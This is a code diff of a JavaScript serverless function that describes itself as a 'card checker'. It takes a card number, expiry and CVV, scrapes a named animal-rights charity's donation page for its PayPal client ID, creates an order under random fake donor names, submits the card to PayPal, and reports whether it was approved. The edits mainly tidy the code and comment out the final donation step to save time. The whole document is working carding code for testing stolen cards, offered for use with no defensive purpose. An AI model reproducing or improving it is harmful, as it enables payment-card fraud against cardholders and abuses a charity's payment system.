@@ -1,6 +1,6 @@
-// api/check.js
-// Vercel Serverless Function - Card checker via PayPal Commerce on animalrights.org.au
-// POST JSON: { "number": "...", "month": "MM", "yearShort": "YY", "cvv": "..." }
+// check.js
+// Vercel Serverless Function - Card checker via PayPal Commerce
+// POST to /api/check with JSON body
 
 const randomString = (length) => {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -54,14 +54,14 @@ export default async function handler(req, res) {
     });
   }
 
-  // Clean inputs a bit
-  const cleanNumber = number.replace(/\s+/g, '');
-  const cleanMonth = month.padStart(2, '0');
-  const cleanYear = `20${yearShort.padStart(2, '0')}`;
+  // Clean card data
+  const cleanNumber = number.toString().replace(/\s+/g, '').trim();
+  const cleanMonth  = month.toString().padStart(2, '0');
+  const fullYear    = `20${yearShort.toString().padStart(2, '0')}`;
 
   const email = generateRandomEmail();
   const firstName = randomString(6);
-  const lastName = randomString(6);
+  const lastName  = randomString(6);
 
   const result = {
     card: `\( {cleanNumber}| \){cleanMonth}|\( {yearShort}| \){cvv}`,
@@ -97,7 +97,6 @@ export default async function handler(req, res) {
       redirect: 'follow'
     });
 
-    // Parse Set-Cookie
     const setCookieHeader = response.headers.get('set-cookie');
     if (setCookieHeader) {
       setCookieHeader.split(',').forEach(cookie => {
@@ -116,7 +115,7 @@ export default async function handler(req, res) {
   };
 
   try {
-    // 1. Get donation page → find form URL
+    // 1. Load donation page
     const homeRes = await makeRequest('https://animalrights.org.au/donate-now/');
     const homeHtml = await homeRes.text();
 
@@ -125,7 +124,7 @@ export default async function handler(req, res) {
 
     let formUrl = formUrlMatch[1].replace(/&amp;/g, '&');
 
-    // 2. Get form page → extract givewpDonationFormExports
+    // 2. Load form data
     const formRes = await makeRequest(formUrl);
     const formHtml = await formRes.text();
 
@@ -133,13 +132,12 @@ export default async function handler(req, res) {
     if (!exportsMatch) throw new Error('Cannot find givewpDonationFormExports');
 
     let exportsStr = exportsMatch[1];
-    // Fix possible trailing comma issues or malformed JSON
-    exportsStr = exportsStr.replace(/,\s*}/g, '}');
+    exportsStr = exportsStr.replace(/,\s*}/g, '}').replace(/,\s*]/g, ']');
 
     const formData = JSON.parse(exportsStr);
 
-    const paypalGateway = formData.registeredGateways.find(g => g.id === 'paypal-commerce');
-    const settings = paypalGateway?.settings || formData.registeredGateways[0]?.settings;
+    const paypalGateway = formData.registeredGateways?.find(g => g.id === 'paypal-commerce');
+    const settings = paypalGateway?.settings || formData.registeredGateways?.[0]?.settings;
 
     if (!settings?.sdkOptions?.clientId) {
       throw new Error('Cannot find PayPal client ID');
@@ -161,7 +159,8 @@ export default async function handler(req, res) {
     });
 
     if (!tokenRes.ok) {
-      throw new Error(`PayPal token failed: ${tokenRes.status} ${await tokenRes.text()}`);
+      const errText = await tokenRes.text();
+      throw new Error(`PayPal token request failed (${tokenRes.status}): ${errText}`);
     }
 
     const tokenJson = await tokenRes.json();
@@ -196,7 +195,7 @@ export default async function handler(req, res) {
 
     const orderId = orderJson.data.id;
 
-    // 5. Confirm payment source (card)
+    // 5. Confirm card
     const confirmRes = await makeRequest(
       `https://www.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
       {
@@ -210,7 +209,7 @@ export default async function handler(req, res) {
             card: {
               number: cleanNumber,
               security_code: cvv,
-              expiry: `\( {cleanYear}- \){cleanMonth}`
+              expiry: `\( {fullYear}- \){cleanMonth}`
             }
           }
         })
@@ -223,10 +222,9 @@ export default async function handler(req, res) {
 
     if (confirmJson.status === 'APPROVED') {
       result.status = 'APPROVED';
-
-      // Optional: try to finalize donation (many times not needed for check)
-      // You can comment out the block below if you only care about APPROVED
-
+      // Final donation step is optional for checking — commented out to reduce time
+      // You can uncomment if you really need it (but increases timeout risk)
+      /*
       const finalParams = new URLSearchParams({
         'givewp-route': 'donate',
         'givewp-route-signature': donateUrlParams.get('givewp-route-signature'),
@@ -253,11 +251,9 @@ export default async function handler(req, res) {
       await makeRequest(`https://animalrights.org.au/?${finalParams.toString()}`, {
         method: 'POST',
         body: finalForm,
-        headers: {
-          'Accept': 'application/json'
-        }
+        headers: { 'Accept': 'application/json' }
       });
-      // We don't really wait for final response in most checkers
+      */
     } else {
       result.status = 'DECLINED';
       result.message = confirmJson?.name || confirmJson?.message || 'Declined by PayPal';
@@ -266,19 +262,19 @@ export default async function handler(req, res) {
   } catch (err) {
     result.status = 'error';
     result.message = err.message;
-    result.details = err.stack ? err.stack.split('\n').slice(0, 6) : null;
+    if (err.stack) {
+      result.stack = err.stack.split('\n').slice(0, 6);
+    }
   }
 
   return res.status(200).json(result);
 }
 
-// Optional: increase limits (Vercel Hobby = 10s timeout, 1024MB memory max)
 export const config = {
   api: {
     bodyParser: {
       sizeLimit: '4mb'
-    },
-    responseLimit: false,
+    }
   },
-  maxDuration: 30,   // seconds (Hobby plan max 10s – upgrade needed for more)
+  maxDuration: 30,          // seconds — Hobby plan max 10s, Pro needed for >10s
 };
